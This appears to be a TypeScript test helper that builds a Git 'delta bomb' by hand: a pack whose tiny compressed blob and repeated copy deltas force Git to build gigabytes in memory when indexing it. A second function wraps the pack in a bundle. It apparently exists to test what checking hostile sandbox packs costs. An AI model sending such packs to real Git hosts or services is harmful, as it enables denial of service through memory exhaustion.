import { createHash } from "node:crypto";
import { deflateSync } from "node:zlib";

/**
 * Git packs and bundles made byte by byte, as a hostile sandbox could make
 * them, to test what checking them costs the control plane. The format is
 * Git's own: https://git-scm.com/docs/gitformat-pack
 */

/** A blob's type number in a pack, and an offset delta's. */
const blobType = 3;
const offsetDeltaType = 6;

/** The largest size one delta copy instruction can copy. */
const largestCopyInBytes = 0xffffff;

/**
 * A pack of one blob of 16 MiB of zeros (a few kilobytes compressed) and
 * `deltaCount` deltas against it, each declaring a result of `resultSizeInBytes`
 * (rounded down to whole copies of the blob, plus one byte that makes each
 * result different). Indexing it makes Git build every result in memory and
 * hash it: the reviewer's pack of 16 KB asked for 2 GiB.
 */
export function buildDeltaBombPack(resultSizeInBytes: number, deltaCount = 1): Buffer {
  const copies = Math.max(1, Math.floor(resultSizeInBytes / largestCopyInBytes));
  const baseHeader = encodeObjectHeader(blobType, largestCopyInBytes);
  const entries: Buffer[] = [
    Buffer.concat([baseHeader, deflateSync(Buffer.alloc(largestCopyInBytes), { level: 9 })]),
  ];
  const baseOffset = 12;
  let offset = baseOffset + (entries[0]?.length ?? 0);
  for (let index = 0; index < deltaCount; index += 1) {
    const delta = Buffer.concat([
      encodeSize(largestCopyInBytes),
      encodeSize(copies * largestCopyInBytes + 1),
      // Copy the whole blob from offset 0, `copies` times, then insert one byte.
      Buffer.alloc(copies * 4, Buffer.from([0xf0, 0xff, 0xff, 0xff])),
      Buffer.from([1, index % 256]),
    ]);
    const entry = Buffer.concat([
      encodeObjectHeader(offsetDeltaType, delta.length),
      encodeOffset(offset - baseOffset),
      deflateSync(delta, { level: 9 }),
    ]);
    entries.push(entry);
    offset += entry.length;
  }
  const header = Buffer.alloc(12);
  header.write("PACK", 0, "latin1");
  header.writeUInt32BE(2, 4);
  header.writeUInt32BE(entries.length, 8);
  const body = Buffer.concat([header, ...entries]);
  return Buffer.concat([body, createHash("sha1").update(body).digest()]);
}

/** A version 2 bundle naming one reference at `tipCommit`, with no prerequisites, around `pack`. */
export function wrapPackInBundle(reference: string, tipCommit: string, pack: Buffer): Buffer {
  return Buffer.concat([Buffer.from(`# v2 git bundle\n${tipCommit} ${reference}\n\n`), pack]);
}

function encodeObjectHeader(type: number, size: number): Buffer {
  const bytes: number[] = [];
  let byte = (type << 4) | (size & 0x0f);
  let rest = Math.floor(size / 16);
  while (rest > 0) {
    bytes.push(byte | 0x80);
    byte = rest & 0x7f;
    rest = Math.floor(rest / 128);
  }
  bytes.push(byte);
  return Buffer.from(bytes);
}

function encodeSize(size: number): Buffer {
  const bytes: number[] = [];
  let rest = size;
  do {
    const byte = rest & 0x7f;
    rest = Math.floor(rest / 128);
    bytes.push(rest > 0 ? byte | 0x80 : byte);
  } while (rest > 0);
  return Buffer.from(bytes);
}

/** An offset delta's distance back to its base, in Git's own variable-length encoding. */
function encodeOffset(distance: number): Buffer {
  const bytes = [distance & 0x7f];
  let rest = distance >>> 7;
  while (rest > 0) {
    rest -= 1;
    bytes.unshift(0x80 | (rest & 0x7f));
    rest >>>= 7;
  }
  return Buffer.from(bytes);
}
